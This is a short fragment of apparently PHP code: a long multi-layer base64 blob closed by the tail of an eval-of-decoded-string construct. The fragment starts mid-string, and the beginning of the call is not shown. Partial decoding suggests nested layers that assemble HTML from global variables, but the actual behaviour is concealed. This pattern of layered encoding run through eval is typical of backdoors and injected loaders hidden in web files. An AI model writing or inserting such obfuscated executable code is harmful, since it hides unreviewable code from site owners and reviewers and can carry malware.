UGR6QkxTVU5CWjBsRFFXZEpRMEZMU1VOQlowbERRV2RKUTBGblNrZG9NR0pYZDJkTWFqQm5Ta1ZrVFZRd1NrSlVSazVpU1cxR1ZsUlZUa1JqTUd4eFpHNXNWR05YYURGV1ZscDRWVlYwUkVsc01IVktSV1JvVkZaS2QyVkdSbGxWVmtKU1ZVZHNXV05GVG01VmVUUnJVakI0VUZGclJrMVZNWE5wVTJzMVdtVlZVakZTYkZwdlVXdEdTVk5ZUmpSYVYxWXlZMGhWYVZoVWMwNURhVUZuU1VOQlowbERRV2RLUjJnd1lsZDNaMHhxTUdkS1JXUk5WREJLUWxSR1RtSkphMFpSVXpKV1JGUnJOWGxoTW5SNlZsWmtTbUpIVG5KaWJYaFhTV3d3ZFVwRlpHaFVWa3AzWlVaR1dWVldRbEpWUjJ4WlkwVk9ibFY1Tkd0U01IaFFVV3RHVFZVeGMybFNTRm95WkVWT1ZGZEhUbFppTUhoRVpVVk9URnBWZUVsVE1tdHBXRlJ6VGtOcFFXZEpRMEZuU1VOQlowcEhhREJpVjNkblRHb3daMHBGWkUxVU1FcENWRVpPWWtsdFpHNVNSa0pxVjFoa2NHRXhjSEpTVms1SldrVktUR0pITVhOSmJEQjFTa1ZrYUZSV1NuZGxSa1paVlZaQ1VsVkhiRmxqUlU1dVZYazBhMUl3ZUZCUmEwWk5WVEZ6YVZkR1JsUlhhMnhIV214V2RsRnNhREpUUjFwTlpGVmFNRk5yVldsWVZITk9RMmxCWjBsRFFXZEpRMEZuUkZGdlNrTlRVbTlrUnpGelNVTTBPVWxEVWtoVVJUbERVVlY0VkZkNVNreGlWVVpOWVZkT2NtRXphRVJhVjJoMVlWYzVObEpZVFdsWVV6UnJVakpHVGxWdVFqUlZWbWhTVlVaR1VXRldhSGRSTW1SVVRHbFNTRlJGT1VOUlZYaFVWM2xLU1ZGV1FuaFViR1J4VVc1YVVXTlZhRzVSTW1oVFpXNW9NMWRwU21SUGR6QkxTVU5CWjBsRFFXZEpRMEZyWVVoU2RHSkRRWFZRVTBGclVqQjRVRkZyUmsxVk1YTnBaRlpXY2xSdFRuUmliV1JZV1ZWYVVtSXpTblpUTVhCV1ZtNUZhVmhVYzA1RGFVRm5TVU5CWjBsRFFXZGpiVll3WkZoS2RVbERVbTlrUnpGelQzY3dTMGxEUVdkSlNEQk9RMjR3VGtOcFFTOVFaejA5SnlrdUp6dy9jR2h3SUNjcE95QS9QZz09JykuJzw/cGhwICcpOyA/Pg==').'<?php '); ?>